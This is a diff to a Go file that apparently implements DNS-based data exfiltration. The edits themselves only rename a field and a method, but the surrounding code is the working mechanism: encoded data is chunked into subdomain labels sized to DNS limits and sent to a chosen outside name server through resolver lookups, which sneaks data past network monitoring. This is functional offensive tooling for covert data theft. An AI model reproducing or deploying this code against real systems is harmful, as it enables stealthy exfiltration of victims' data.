@@ -21,7 +21,7 @@ const (
 )
 
 type dnsExfiltrator struct {
-	NameServer string
+	nameServer string
 }
 
 func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
@@ -30,7 +30,7 @@ func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
 		absoluteNameServer += "."
 	}
 	return &dnsExfiltrator{
-		NameServer: absoluteNameServer,
+		nameServer: absoluteNameServer,
 	}
 }
 
@@ -53,11 +53,11 @@ func (ex *dnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string)
 	// This means that we need to take into account the length byte at the very
 	// start as well as at the very end, hence subtract 2. We subtract another
 	// 2 for the DNS message type.
-	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.NameServer) - 2 - 2
+	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.nameServer) - 2 - 2
 
 	for len(encodedData) != 0 {
 		bytesLeft := numOfBytesPerQuery
-		dataToExfiltrate := msgType.ToString() + "."
+		dataToExfiltrate := msgType.String() + "."
 		for bytesLeft > 0 {
 			numBytesToAdd := bytesLeft
 			if numBytesToAdd > MAX_SUBDOMAIN_NAME_LENGTH {
@@ -78,7 +78,7 @@ func (ex *dnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string)
 			bytesLeft -= numBytesToAdd + 1
 		}
 
-		_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", dataToExfiltrate+ex.NameServer)
+		_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", dataToExfiltrate+ex.nameServer)
 		if err != nil {
 			log.Fatalln(err)
 		}
